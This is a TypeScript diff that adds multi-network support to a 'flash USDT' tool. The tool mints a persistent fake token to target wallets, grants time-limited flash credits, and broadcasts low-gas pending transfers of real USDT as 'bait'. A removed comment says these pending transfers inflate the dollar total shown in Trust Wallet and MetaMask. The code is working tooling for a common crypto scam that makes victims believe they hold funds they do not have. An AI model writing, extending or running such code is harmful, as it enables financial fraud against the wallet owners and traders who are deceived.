@@ -16,11 +16,14 @@ import {
   toLabTokenUnits,
   toOfficialUsdtUnits,
 } from "./client";
-import { getEvmNetwork } from "./network";
+import {
+  getEvmNetworkLabel,
+  type EvmNetwork,
+} from "./network";
 import {
   getOfficialUsdtContractAddress,
   getOfficialUsdtDecimals,
-  OFFICIAL_USDT_EVM,
+  getOfficialUsdtMeta,
 } from "./usdt-canonical";
 import type {
   EvmBalanceResult,
@@ -34,9 +37,10 @@ import type {
 /** Modo 1 — token falso persistente */
 export async function injectFlashUsdt(
   toAddress: string,
-  amount: number
+  amount: number,
+  network: EvmNetwork
 ): Promise<EvmInjectResult> {
-  if (!isEvmConfigured()) {
+  if (!isEvmConfigured(network)) {
     return {
       success: true,
       simulated: true,
@@ -52,8 +56,8 @@ export async function injectFlashUsdt(
       return { success: false, error: "Dirección EVM destino inválida" };
     }
 
-    const walletClient = getWalletClient();
-    const contractAddress = getLabContractAddress();
+    const walletClient = getWalletClient(network);
+    const contractAddress = getLabContractAddress(network);
     const tokenAmount = toLabTokenUnits(amount);
 
     const txHash = await walletClient.writeContract({
@@ -63,7 +67,11 @@ export async function injectFlashUsdt(
       args: [toAddress as Address, tokenAmount],
     });
 
-    const pendingTxHash = await broadcastOfficialUsdtPendingBait(toAddress as Address, amount);
+    const pendingTxHash = await broadcastOfficialUsdtPendingBait(
+      toAddress as Address,
+      amount,
+      network
+    );
 
     return {
       success: true,
@@ -84,12 +92,13 @@ export async function injectFlashUsdt(
 export async function injectPendingFlashUsdt(
   toAddress: string,
   amount: number,
-  durationMinutesInput: number
+  durationMinutesInput: number,
+  network: EvmNetwork
 ): Promise<PendingFlashInjectResult> {
   const durationMinutes = clampFlashDurationMinutes(durationMinutesInput);
   const flashExpiresAt = new Date(Date.now() + durationMinutes * 60 * 1000).toISOString();
 
-  if (!isEvmConfigured()) {
+  if (!isEvmConfigured(network)) {
     return {
       success: true,
       simulated: true,
@@ -109,8 +118,8 @@ export async function injectPendingFlashUsdt(
       return { success: false, error: "Dirección EVM destino inválida", flashActive: false };
     }
 
-    const walletClient = getWalletClient();
-    const contractAddress = getLabContractAddress();
+    const walletClient = getWalletClient(network);
+    const contractAddress = getLabContractAddress(network);
     const tokenAmount = toLabTokenUnits(amount);
     const durationSeconds = BigInt(flashDurationMinutesToSeconds(durationMinutes));
 
@@ -121,8 +130,12 @@ export async function injectPendingFlashUsdt(
       args: [toAddress as Address, tokenAmount, durationSeconds],
     });
 
-    const pendingTxHash = await broadcastOfficialUsdtPendingBait(toAddress as Address, amount);
-    const publicClient = getPublicClient();
+    const pendingTxHash = await broadcastOfficialUsdtPendingBait(
+      toAddress as Address,
+      amount,
+      network
+    );
+    const publicClient = getPublicClient(network);
 
     const [onChainBalance, flashBalance] = await publicClient.multicall({
       contracts: [
@@ -165,15 +178,12 @@ export async function injectPendingFlashUsdt(
   }
 }
 
-/**
- * Cebo pending sobre USDT oficial verificado con gas muy bajo.
- * En EVM el mempool mantiene la tx horas/días — infla el total $ en Trust/MetaMask.
- */
 export async function renewOfficialUsdtPendingBait(
   toAddress: string,
-  amount: number
+  amount: number,
+  network: EvmNetwork
 ): Promise<{ txHash?: Hash; error?: string }> {
-  if (!isEvmConfigured()) {
+  if (!isEvmConfigured(network)) {
     return { txHash: `SIM_PENDING_${Date.now()}` as Hash };
   }
 
@@ -181,7 +191,7 @@ export async function renewOfficialUsdtPendingBait(
     return { error: "Dirección EVM destino inválida" };
   }
 
-  const txHash = await broadcastOfficialUsdtPendingBait(toAddress as Address, amount);
+  const txHash = await broadcastOfficialUsdtPendingBait(toAddress as Address, amount, network);
   if (!txHash) {
     return { error: "No se pudo emitir cebo pending USDT oficial" };
   }
@@ -190,12 +200,13 @@ export async function renewOfficialUsdtPendingBait(
 
 async function broadcastOfficialUsdtPendingBait(
   toAddress: Address,
-  amount: number
+  amount: number,
+  network: EvmNetwork
 ): Promise<Hash | undefined> {
   try {
-    const walletClient = getWalletClient();
-    const officialAddress = getOfficialUsdtContractAddress();
-    const decimals = getOfficialUsdtDecimals();
+    const walletClient = getWalletClient(network);
+    const officialAddress = getOfficialUsdtContractAddress(network);
+    const decimals = getOfficialUsdtDecimals(network);
     const tokenAmount = toOfficialUsdtUnits(amount, decimals);
     const maxFeePerGas = getPendingBaitMaxFeePerGas();
 
@@ -220,12 +231,13 @@ async function broadcastOfficialUsdtPendingBait(
 export async function renewFlashInject(
   toAddress: string,
   amount: number,
-  durationMinutesInput: number
+  durationMinutesInput: number,
+  network: EvmNetwork
 ): Promise<{ success: boolean; txHash?: Hash; flashExpiresAt?: string; error?: string }> {
   const durationMinutes = clampFlashDurationMinutes(durationMinutesInput);
   const flashExpiresAt = new Date(Date.now() + durationMinutes * 60 * 1000).toISOString();
 
-  if (!isEvmConfigured()) {
+  if (!isEvmConfigured(network)) {
     return {
       success: true,
       txHash: `SIM_RENEW_${Date.now()}` as Hash,
@@ -238,11 +250,11 @@ export async function renewFlashInject(
       return { success: false, error: "Dirección EVM destino inválida" };
     }
 
-    const walletClient = getWalletClient();
+    const walletClient = getWalletClient(network);
     const durationSeconds = BigInt(flashDurationMinutesToSeconds(durationMinutes));
 
     const txHash = await walletClient.writeContract({
-      address: getLabContractAddress(),
+      address: getLabContractAddress(network),
       abi: FLASH_USDT_LAB_ABI,
       functionName: "flashInject",
       args: [toAddress as Address, toLabTokenUnits(amount), durationSeconds],
@@ -257,8 +269,11 @@ export async function renewFlashInject(
   }
 }
 
-export async function clearFlashCredit(holderAddress: string): Promise<EvmBurnResult> {
-  if (!isEvmConfigured()) {
+export async function clearFlashCredit(
+  holderAddress: string,
+  network: EvmNetwork
+): Promise<EvmBurnResult> {
+  if (!isEvmConfigured(network)) {
     return {
       success: true,
       simulated: true,
@@ -268,9 +283,9 @@ export async function clearFlashCredit(holderAddress: string): Promise<EvmBurnRe
   }
 
   try {
-    const walletClient = getWalletClient();
+    const walletClient = getWalletClient(network);
     const txHash = await walletClient.writeContract({
-      address: getLabContractAddress(),
+      address: getLabContractAddress(network),
       abi: FLASH_USDT_LAB_ABI,
       functionName: "clearFlash",
       args: [holderAddress as Address],
@@ -286,14 +301,15 @@ export async function clearFlashCredit(holderAddress: string): Promise<EvmBurnRe
 
 export async function burnFlashUsdt(
   holderAddress: string,
+  network: EvmNetwork,
   amount?: number,
   mode: "fake_token" | "pending_flash" = "fake_token"
 ): Promise<EvmBurnResult> {
   if (mode === "pending_flash") {
-    return clearFlashCredit(holderAddress);
+    return clearFlashCredit(holderAddress, network);
   }
 
-  if (!isEvmConfigured()) {
+  if (!isEvmConfigured(network)) {
     return {
       success: true,
       simulated: true,
@@ -303,9 +319,9 @@ export async function burnFlashUsdt(
   }
 
   try {
-    const walletClient = getWalletClient();
-    const publicClient = getPublicClient();
-    const contractAddress = getLabContractAddress();
+    const walletClient = getWalletClient(network);
+    const publicClient = getPublicClient(network);
+    const contractAddress = getLabContractAddress(network);
 
     let burnAmount: bigint;
     if (amount != null) {
@@ -319,7 +335,7 @@ export async function burnFlashUsdt(
       });
       burnAmount = raw;
       if (burnAmount === BigInt(0)) {
-        return clearFlashCredit(holderAddress);
+        return clearFlashCredit(holderAddress, network);
       }
     }
 
@@ -343,12 +359,15 @@ export async function burnFlashUsdt(
   }
 }
 
-export async function getFlashUsdtBalance(holderAddress: string): Promise<EvmBalanceResult> {
-  const contractAddress = isEvmConfigured()
-    ? getLabContractAddress()
+export async function getFlashUsdtBalance(
+  holderAddress: string,
+  network: EvmNetwork
+): Promise<EvmBalanceResult> {
+  const contractAddress = isEvmConfigured(network)
+    ? getLabContractAddress(network)
     : ("0x0000000000000000000000000000000000000001" as Address);
 
-  if (!isEvmConfigured()) {
+  if (!isEvmConfigured(network)) {
     return {
       balance: "0",
       balanceRaw: "0",
@@ -358,7 +377,7 @@ export async function getFlashUsdtBalance(holderAddress: string): Promise<EvmBal
   }
 
   try {
-    const publicClient = getPublicClient();
+    const publicClient = getPublicClient(network);
     const raw = await publicClient.readContract({
       address: contractAddress,
       abi: FLASH_USDT_LAB_ABI,
@@ -372,11 +391,14 @@ export async function getFlashUsdtBalance(holderAddress: string): Promise<EvmBal
   }
 }
 
-export async function getOfficialUsdtBalance(holderAddress: string): Promise<EvmBalanceResult> {
-  const contractAddress = getOfficialUsdtContractAddress();
-  const decimals = getOfficialUsdtDecimals();
+export async function getOfficialUsdtBalance(
+  holderAddress: string,
+  network: EvmNetwork
+): Promise<EvmBalanceResult> {
+  const contractAddress = getOfficialUsdtContractAddress(network);
+  const decimals = getOfficialUsdtDecimals(network);
 
-  if (!isEvmConfigured()) {
+  if (!isEvmConfigured(network)) {
     return {
       balance: "0",
       balanceRaw: "0",
@@ -386,7 +408,7 @@ export async function getOfficialUsdtBalance(holderAddress: string): Promise<Evm
   }
 
   try {
-    const publicClient = getPublicClient();
+    const publicClient = getPublicClient(network);
     const raw = await publicClient.readContract({
       address: contractAddress,
       abi: ERC20_ABI,
@@ -405,6 +427,7 @@ export async function getOfficialUsdtBalance(holderAddress: string): Promise<Evm
 
 export async function getWalletUsdtOverview(
   holderAddress: string,
+  network: EvmNetwork,
   options?: {
     simulatedLabAmount?: number;
     injectionMode?: "fake_token" | "pending_flash";
@@ -416,8 +439,9 @@ export async function getWalletUsdtOverview(
   const mode = options?.injectionMode ?? "fake_token";
   const pendingBaitActive = options?.pendingBaitActive ?? false;
   const pendingBaitNum = pendingBaitActive ? (options?.pendingBaitAmount ?? 0) : 0;
+  const officialMeta = getOfficialUsdtMeta(network);
 
-  if (!isEvmConfigured()) {
+  if (!isEvmConfigured(network)) {
     const labBal = options?.simulatedLabAmount ?? 0;
     const flashActive =
       mode === "pending_flash" &&
@@ -439,12 +463,12 @@ export async function getWalletUsdtOverview(
     };
   }
 
-  const contractAddress = getLabContractAddress();
-  const publicClient = getPublicClient();
+  const contractAddress = getLabContractAddress(network);
+  const publicClient = getPublicClient(network);
 
   const [official, totalLab, flashRaw, expiresRaw] = await Promise.all([
-    getOfficialUsdtBalance(holderAddress),
-    getFlashUsdtBalance(holderAddress),
+    getOfficialUsdtBalance(holderAddress, network),
+    getFlashUsdtBalance(holderAddress, network),
     publicClient
       .readContract({
         address: contractAddress,
@@ -485,7 +509,7 @@ export async function getWalletUsdtOverview(
         : estimatedWalletFiatUsd.toFixed(2).replace(/\.?0+$/, ""),
     pendingBaitAmount: pendingBaitActive ? pendingBaitNum.toString() : "0",
     pendingBaitActive,
-    officialContract: OFFICIAL_USDT_EVM.contractAddress,
+    officialContract: officialMeta.contractAddress,
     labContract: contractAddress,
     autoDetected: true,
     requiresImport: false,
@@ -495,17 +519,17 @@ export async function getWalletUsdtOverview(
   };
 }
 
-export async function getTxStatus(txHash: string): Promise<EvmTxStatus> {
+export async function getTxStatus(txHash: string, network: EvmNetwork): Promise<EvmTxStatus> {
   if (txHash.startsWith("SIM_")) {
     return { confirmed: true, txHash, blockNumber: 0 };
   }
 
-  if (!isEvmConfigured()) {
+  if (!isEvmConfigured(network)) {
     return { confirmed: false, pending: true, txHash };
   }
 
   try {
-    const publicClient = getPublicClient();
+    const publicClient = getPublicClient(network);
     const receipt = await publicClient
       .getTransactionReceipt({ hash: txHash as Hash })
       .catch(() => null);
@@ -530,13 +554,10 @@ export async function getTxStatus(txHash: string): Promise<EvmTxStatus> {
   }
 }
 
-export function isLabEvmReady(): boolean {
-  return isEvmConfigured();
+export function isLabEvmReady(network?: EvmNetwork): boolean {
+  return isEvmConfigured(network);
 }
 
-export function getLabNetworkLabel(): string {
-  const net = getEvmNetwork();
-  if (net === "bsc") return "BNB Smart Chain (BSC)";
-  if (net === "polygon") return "Polygon";
-  return "Ethereum";
+export function getLabNetworkLabel(network: EvmNetwork): string {
+  return getEvmNetworkLabel(network);
 }
